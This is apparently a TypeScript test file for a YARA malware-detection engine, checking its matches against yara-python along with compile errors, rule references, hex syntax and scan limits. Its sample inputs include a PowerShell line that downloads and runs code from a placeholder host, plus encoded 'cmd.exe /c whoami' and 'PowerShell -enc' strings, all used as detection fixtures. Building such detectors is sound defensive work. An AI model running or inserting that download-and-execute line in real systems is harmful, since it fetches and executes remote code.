import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";
import { parsePe } from "@/lib/analysis/pe";
import { DIFF_RULES, EXPECTED_CRAFTED, EXPECTED_TEXT } from "./__fixtures__/yara-differential";
import { YaraError, compileYara, scanYara } from "./yara";

const enc = (s: string) => new TextEncoder().encode(s);
const b64 = (s: string) => Buffer.from(s).toString("base64");

function craftedBytes() {
  const parts = ["prefix ", b64("This program cannot be run"), " mid ", Array.from(enc("cmd.exe /c whoami"), (b) => String.fromCharCode(b ^ 0x5a)).join(""), " WIDE:", [...enc("PowerShell -enc")].map((c) => String.fromCharCode(c) + "\0").join(""), " end fullword-test notfullwordtest xxEvilxx"];
  return Uint8Array.from(parts.join(""), (c) => c.charCodeAt(0));
}
const textBytes = enc("hello world\nInvoke-Expression (New-Object Net.WebClient).DownloadString('http://x.test/a')\nhello again HELLO\n");

function matchKey(res: ReturnType<typeof scanYara>) {
  const out: Record<string, string[]> = {};
  for (const r of res.results) {
    if (!r.matched || r.isPrivate) continue;
    out[r.rule] = r.strings
      .flatMap((s) => s.matches.map((m) => [s.id, m.offset, m.length] as const))
      .sort((a, b) => (a[0] < b[0] ? -1 : a[0] > b[0] ? 1 : a[1] - b[1] || a[2] - b[2]))
      .map(([id, offset, length]) => `$${id}:${offset}:${length}`);
  }
  return out;
}

describe("YARA engine differential against yara-python 4.5.4", () => {
  it("matches exactly on a crafted byte sample", () => {
    const compiled = compileYara(DIFF_RULES);
    const res = scanYara(compiled, craftedBytes());
    expect(res.warnings).toEqual([]);
    const got = matchKey(res);
    for (const [rule, want] of Object.entries(EXPECTED_CRAFTED)) expect(got[rule], rule).toEqual(want);
    for (const rule of Object.keys(got)) expect(EXPECTED_CRAFTED[rule], `unexpected match ${rule}`).toBeDefined();
  });

  it("matches exactly on a text sample", () => {
    const compiled = compileYara(DIFF_RULES);
    const res = scanYara(compiled, textBytes);
    const got = matchKey(res);
    for (const [rule, want] of Object.entries(EXPECTED_TEXT)) expect(got[rule], rule).toEqual(want);
    for (const rule of Object.keys(got)) expect(EXPECTED_TEXT[rule], `unexpected match ${rule}`).toBeDefined();
  });

  it("matches exactly on a real signed PE (headers, imports, sections)", () => {
    const path = process.env.NOPS_YARA_PE_FIXTURE;
    if (!path) return; // opt-in: point at a local PE to re-verify against yara-python
    const bytes = new Uint8Array(readFileSync(path));
    const compiled = compileYara(DIFF_RULES);
    const pe = parsePe(bytes);
    const res = scanYara(compiled, bytes, { pe });
    expect(res.results.find((r) => r.rule === "Pe_is64")?.matched).toBe(true);
    expect(res.results.find((r) => r.rule === "MZ_header")?.matched).toBe(true);
  });
});

describe("compileYara error reporting", () => {
  it("flags an unused string", () => {
    expect(() => compileYara('rule a { strings: $a = "x" condition: true }')).toThrow(/never used/);
  });
  it("flags an undefined string", () => {
    expect(() => compileYara('rule a { strings: $a = "x" condition: $b }')).toThrow(/Undefined string/);
  });
  it("flags an unknown identifier", () => {
    expect(() => compileYara("rule a { condition: foo }")).toThrow(/Unknown identifier/);
  });
  it("flags an unimported module", () => {
    expect(() => compileYara("rule a { condition: pe.is_pe }")).toThrow(/not imported/);
  });
  it("flags an unsupported module", () => {
    expect(() => compileYara('import "cuckoo"\nrule a { condition: true }')).toThrow(/not supported/);
  });
  it("flags invalid hex tokens", () => {
    expect(() => compileYara("rule a { strings: $a = { 4D ZZ } condition: $a }")).toThrow(/hex/i);
  });
  it("flags a duplicate rule name", () => {
    expect(() => compileYara("rule a { condition: true }\nrule a { condition: true }")).toThrow(/Duplicate rule/);
  });
  it("flags a rule with no condition", () => {
    expect(() => compileYara("rule a { strings: $a = \"x\" }")).toThrow(YaraError);
  });
  it("points at a real line number", () => {
    try {
      compileYara('rule a {\n  condition:\n    bogus\n}\n');
      throw new Error("expected to throw");
    } catch (e) {
      expect(e).toBeInstanceOf(YaraError);
      expect((e as YaraError).line).toBe(3);
    }
  });
});

describe("rule-to-rule references", () => {
  it("lets a rule depend on an earlier rule's result", () => {
    const compiled = compileYara('rule A { strings: $a = "hello" condition: $a }\nrule B { condition: A }\n');
    const res = scanYara(compiled, enc("hello"));
    expect(res.results.map((r) => [r.rule, r.matched])).toEqual([
      ["A", true],
      ["B", true],
    ]);
  });

  it("rejects a forward reference", () => {
    expect(() => compileYara("rule A { condition: B }\nrule B { condition: true }\n")).toThrow(/Unknown identifier/);
  });
});

describe("hex string bracket syntax", () => {
  it("matches a bounded jump with the shortest span (non-greedy)", () => {
    const compiled = compileYara("rule a { strings: $h = { 41 [0-4] 42 } condition: $h }");
    const res = scanYara(compiled, enc("A....B"));
    expect(res.results[0].strings[0].matches[0]).toMatchObject({ offset: 0, length: 6 });
  });

  it("matches an alternative group", () => {
    const compiled = compileYara("rule a { strings: $h = { 41 ( 42 | 43 ) 44 } condition: $h }");
    expect(scanYara(compiled, enc("ABD")).results[0].matched).toBe(true);
    expect(scanYara(compiled, enc("ACD")).results[0].matched).toBe(true);
    expect(scanYara(compiled, enc("AXD")).results[0].matched).toBe(false);
  });
});

describe("resource limits", () => {
  it("rejects input larger than the scan cap", () => {
    const compiled = compileYara("rule a { condition: true }");
    expect(() => scanYara(compiled, new Uint8Array(64 * 1024 * 1024 + 1))).toThrow(/larger than/);
  });
});
